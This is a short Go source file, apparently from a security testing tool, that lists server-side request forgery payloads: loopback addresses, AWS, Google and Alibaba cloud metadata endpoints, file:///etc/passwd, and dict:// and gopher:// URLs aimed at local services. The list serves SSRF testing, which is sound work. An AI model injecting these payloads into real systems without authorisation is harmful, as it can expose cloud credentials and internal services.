package techniques

// SSRFPayloads for server-side request forgery testing.
var SSRFPayloads = []string{
	"http://127.0.0.1",
	"http://localhost",
	"http://0.0.0.0",
	"http://[::1]",
	"http://169.254.169.254/latest/meta-data/",
	"http://metadata.google.internal/computeMetadata/v1/",
	"http://100.100.100.200/latest/meta-data/",
	"file:///etc/passwd",
	"dict://localhost:11211/stat",
	"gopher://localhost:25/",
}

// SSRFDescription describes the SSRF technique.
const SSRFDescription = "Server-Side Request Forgery - Tests for SSRF by injecting internal URLs and cloud metadata endpoints"
